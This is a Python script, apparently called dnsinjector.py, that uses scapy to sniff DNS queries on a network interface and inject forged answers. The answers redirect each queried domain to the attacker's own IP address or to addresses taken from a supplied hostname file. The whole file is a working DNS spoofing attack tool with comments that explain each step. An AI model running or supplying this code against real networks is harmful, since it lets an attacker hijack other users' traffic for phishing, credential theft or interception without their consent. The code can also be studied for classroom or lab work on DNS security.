import sys
import scapy.all as scapy

# Get a list of all network interfaces available on the system
ip = scapy.get_if_list()
print(ip)

# Function to retrieve the IP to hijack based on the queried domain
def get_hijack_ip(query):
    """
    Returns the IP to use for hijacking based on the queried domain.
    If a specific IP for the domain is found in the hostnames dictionary, it is returned.
    Otherwise, the default attacker IP is used.
    """
    query = query.rstrip('.')  # Remove any trailing dot from the domain
    return hostnames.get(query, attacker_ip)  # Return the IP from hostnames, or attacker_ip if not found

# Function to sniff DNS packets and inject forged responses
def inject(packet, attacker_ip, interface):
    """
    Inspects each DNS packet and injects a forged response if it is a DNS query.
    This function modifies the packet details to match a legitimate response
    while directing the query to the attacker's IP.
    """
    # Process only DNS query packets (where DNS query response flag `qr` is 0)
    if not packet.haslayer(scapy.DNS) or packet[scapy.DNS].qr != 0:
        return  # Exit if it's not a DNS query packet

    # Get the attacker IP for the queried domain
    attacker_ip = get_hijack_ip(packet[scapy.DNS].qd.qname.decode())
    print(attacker_ip)  # Print the attacker IP for debugging purposes

    # Create a DNS response payload with the query details
    payload = scapy.DNS(
        id=packet[scapy.DNS].id,         # Match Transaction ID from the original query
        qr=1,            # Set response flag to indicate it's a response
        opcode=0,        # Standard query
        aa=0,            # Not authoritative answer
        an=1,            # Number of answers
        tc=0,            # Not truncated
        rd=1,            # Recursion desired
        ra=1,            # Recursion available
        z=0,             # Reserved
        ad=0,            # Authenticated Data flag
        rcode=0          # No error
    )

    # Add the original query in the Question Section of the DNS response
    payload.qd = scapy.DNSQR(qname=packet[scapy.DNS].qd.qname, qtype="A", qclass="IN")

    # Add a forged answer in the Answer Section, pointing to the attacker's IP
    payload.an = scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, rdata=attacker_ip, ttl=160428)
    payload.ar = scapy.DNSRR(type="OPT")  # Optional additional record for EDNS

    # Reconstruct the packet with Ethernet, IP, UDP layers and the DNS payload
    eth_frame = scapy.Ether(src=packet[scapy.Ether].dst, dst=packet[scapy.Ether].src)  # Reverse MAC addresses
    ip_packet = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)           # Reverse IP addresses
    udp_segment = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)  # Reverse UDP ports
    final_packet = eth_frame / ip_packet / udp_segment / payload  # Combine layers to form the final packet

    # Send the forged DNS response on the specified interface
    scapy.sendp(final_packet, iface=interface, verbose=False)

# Main program entry point
if __name__ == "__main__":

    hostnames = {}  # Dictionary to hold IP-hostname pairs loaded from a hostname file
    interface = "en0"

    # Validate the command-line arguments
    if len(sys.argv) < 3 or len(sys.argv) > 5:
        print("Usage: dnsinjector.py [-i interface] [-h hostnames]")
        sys.exit(1)

    # Parse command-line arguments for interface and hostname file
    for i in range(1, len(sys.argv)):
        if sys.argv[i] == "-i":  # Interface argument
            interface = sys.argv[i + 1]
            print(interface)  # Print selected interface for confirmation
        elif sys.argv[i] == "-h":  # Hostname file argument
            hostname_file = sys.argv[i + 1]
            try:
                # Load IP-hostname pairs from the hostname file
                with open(hostname_file, 'r') as file:
                    for line in file:
                        ip, hostname = line.strip().split(',')
                        hostnames[hostname.strip()] = ip.strip()  # Populate the hostnames dictionary
                print(f"Loaded {len(hostnames)} hostnames from {hostname_file}.")
            except FileNotFoundError:
                print(f"Hostname file {hostname_file} not found.")
                sys.exit(1)

    # Retrieve the attacker's IP based on the selected network interface
    attacker_ip = scapy.get_if_addr(interface)

    # Start sniffing DNS traffic on the specified interface and inject forged responses
    print("Starting DNS injection...")
    scapy.sniff(
        iface=interface,  # Interface to sniff on
        filter="ip and udp port 53",  # Only capture DNS traffic (UDP on port 53)
        prn=lambda packet: inject(packet, attacker_ip, interface),  # Call inject function on each packet
        store=0  # Do not store packets in memory
    )
